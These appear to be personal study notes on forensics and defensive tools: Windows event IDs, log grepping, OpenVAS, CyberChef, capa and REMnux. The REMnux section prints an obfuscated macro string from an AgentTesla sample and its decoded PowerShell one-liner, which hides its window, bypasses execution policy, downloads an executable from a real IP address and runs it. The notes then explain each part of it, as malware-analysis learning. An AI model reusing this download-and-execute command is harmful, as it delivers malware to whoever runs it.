
### Links

- https://www.autopsy.com/
- https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html
- https://volatilityfoundation.org/


### Event viewer

#### Log codes:
Event ID 	Description
4624 		A user account successfully logged in
4625 		A user account failed to login
4634 		A user account successfully logged off
4720 		A user account was created
4724 		An attempt was made to reset an account’s password
4722 		A user account was enabled
4725 		A user account was disabled
4726 		A user account was deleted

### Logs in Linux

- `cat access.log`
-`cat access1.log access2.log > combined_access.log`
-`grep "192.168.1.1" access.log`
-`less access.log`
-`grep "GET" access.log`
-`grep "POST" access.log`


# SIEM


## openVAS

### installing OpenVAS
- `sudo apt install docker.io`
- `sudo docker run -d -p 443:443 --name openvas mikesplain/openvas`


### Running Openvas
- `docker start openvas`
- navigate to https://127.0.0.1 in a browser
- log in

## CyberChef

- link to run in browser: https://gchq.github.io/CyberChef/
- link to download: https://github.com/gchq/CyberChef/releases

#### operations area:
Operations 	Description 	Examples
From Morse Code 	Translates Morse Code into (upper case) alphanumeric characters. 	- .... .-. . .- - ... becomes THREATS when used with default parameters
URL Encode 	Encodes problematic characters into percent-encoding, a format supported by URIs/URLs. 	https://tryhackme.com/r/room/cyberchefbasics becomes https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics when used with the parameter “Encode all special chars”
To Base64 	This operation encodes raw data into an ASCII Base64 string. 	This is fun! becomes VGhpcyBpcyBmdW4h
To Hex 	Converts the input string to hexadecimal bytes separated by the specified delimiter. 	This Hex conversion is awesome! becomes 54 68 69 73 20 48 65 78 20 63 6f 6e 76 65 72 73 69 6f 6e 20 69 73 20 61 77 65 73 6f 6d 65 21
To Decimal 	Converts the input data to an ordinal integer array. 	This Decimal conversion is awesome! becomes 84 104 105 115 32 68 101 99 105 109 97 108 32 99 111 110 118 101 114 115 105 111 110 32 105 115 32 97 119 101 115 111 109 101 33
ROT13 	A simple Caesar substitution cipher which rotates alphabet characters by the specified amount (default 13). 	Digital Forensics and Incident Response becomes Qvtvgny Sberafvpf naq Vapvqrag Erfcbafr


#### Recipe Area:

Save recipe: This feature allows the user to save selected operations.
Load recipe: Allows the user to load previously saved recipes.
Clear Recipe: This feature will enable users to clear the chosen recipe during usage.


#### Input Area

- Add a new input tab: This is where an additional tab is created for the user to use different values from the previous tab.

- Open folder as input: This feature allows users to upload a whole folder as input value.

- Clear input and output: This feature allows the user to clear any input values inserted and the corresponding output value.

- Reset pane layout: This feature brings the tool's interface to its default window sizes.


#### Output Area

- Save output to file: This feature allows the users to save the result into a .dat file.

- Copy raw output to the clipboard: This feature allows users to copy raw output directly to their clipboard, allowing them to quickly copy the results for use in other applications or documents.

- Replace input with output: This feature allows users to quickly overwrite the input data based on the operations' results.

- Maximise output pane: This feature brings the tool's interface to its default window sizes.




## CAPA

to run:
- PS C:\Users\Administrator\Desktop\capa> capa.exe .\cryptbot.bin

#### Flags:

Option 	Description 	Sample Syntax

-h or --help
	Show this help message and exit.
	

capa -h
-v or --verbose 	Enable verbose result document. 	capa.exe .\cryptbot.bin -v
-vv or --vverbose 	Enable a very verbose result document. 	capa.exe .\cryptbot.bin -vv 




# REMnux

- `oledump.py agenttesla.xlsm`

	displays: `A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
`

- `oledump.py agenttesla.xlsm -s 4`

	displays: hex dump of file

- `oledump.py agenttesla.xlsm -s 4 -vbadecompress`

	displays: more readable format
		- `Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")`


![[Pasted image 20250415093239.png]]
``"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"``

So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.
    By default, PowerShell restricts script execution for security reasons. The -executionpolicy parameter allows you to override this policy. The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.
    The Invoke-WebRequest is commonly used for downloading files from the internet.
        The -Uri Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource Doc-3737122pdf.exe from http://193.203.203.67/rt/.
        The -OutFile specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
    The Start-Process is used to execute the downloaded file that is stored in $TempFile after the web request.

To summarize, when the document agenttesla.xlsm is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named Doc-3737122pdf.exe from http://193.203.203.67/rt/, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (Doc-3737122pdf.exe). This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!